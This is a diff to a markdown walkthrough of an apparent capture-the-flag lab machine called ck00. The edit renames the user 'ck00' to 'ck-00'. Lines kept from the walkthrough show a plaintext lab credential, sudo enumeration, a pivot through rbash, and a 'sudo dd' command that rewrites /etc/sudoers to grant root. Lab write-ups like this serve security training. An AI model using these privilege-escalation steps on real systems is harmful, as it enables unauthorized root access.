@@ -184,7 +184,7 @@ Update `/etc/hosts` with **ck** DNS
 192.168.1.142 ck
 ```
 
-WordPress Login Page: http://ck/wp-login.php \
+WordPress Login Page: http://ck/wp-login.php
 
 ### WordPress Analysis
 
@@ -604,9 +604,9 @@ uid=1001(bla1) gid=1001(bla1) groups=1001(bla1)
 
 Credentials: **bla1**:**bla1_is_my_password**
 
-### Privilege Escalation to `ck00`
+### Privilege Escalation to `ck-00`
 
-Apparently `bla1` is allow to run `/bin/rbash` as `ck00`.
+Apparently `bla1` is allow to run `/bin/rbash` as `ck-00`.
 ```
 bla1@ck00:~$ sudo -l
 Matching Defaults entries for bla1 on ck00:
@@ -616,7 +616,7 @@ User bla1 may run the following commands on ck00:
     (ck-00) NOPASSWD: /bin/rbash
 ```
 
-Running `/bin/rbash` as `ck00`
+Running `/bin/rbash` as `ck-00`
 ```
 bla1@ck00:~$ sudo -u ck-00 /bin/rbash
 To run a command as administrator (user "root"), use "sudo <command>".
@@ -628,7 +628,7 @@ uid=1000(ck-00) gid=1000(ck-00) groups=1000(ck-00),4(adm),24(cdrom),27(sudo),30(
 
 ### Privilege Escalation to Root
 
-Apparently `ck00` is allow to run `/bin/dd` as super user.
+Apparently `ck-00` is allow to run `/bin/dd` as super user.
 ```
 ck-00@ck00:~$ sudo -l
 Matching Defaults entries for ck-00 on ck00:
@@ -674,7 +674,7 @@ bla1 ALL=(ck-00) NOPASSWD : /bin/rbash
 ck-00 ALL=NOPASSWD:/bin/dd
 ```
 
-Attempt to add a new allow all rule for `ck00` ( ck-00 ALL=(ALL) NOPASSWD: ALL )
+Attempt to add a new allow all rule for `ck-00` ( ck-00 ALL=(ALL) NOPASSWD: ALL )
 ```
 ck-00@ck00:~$ echo -e "$(sudo dd if=/etc/sudoers)\nck-00 ALL=(ALL) NOPASSWD: ALL" | sudo dd of=/etc/sudoers
 
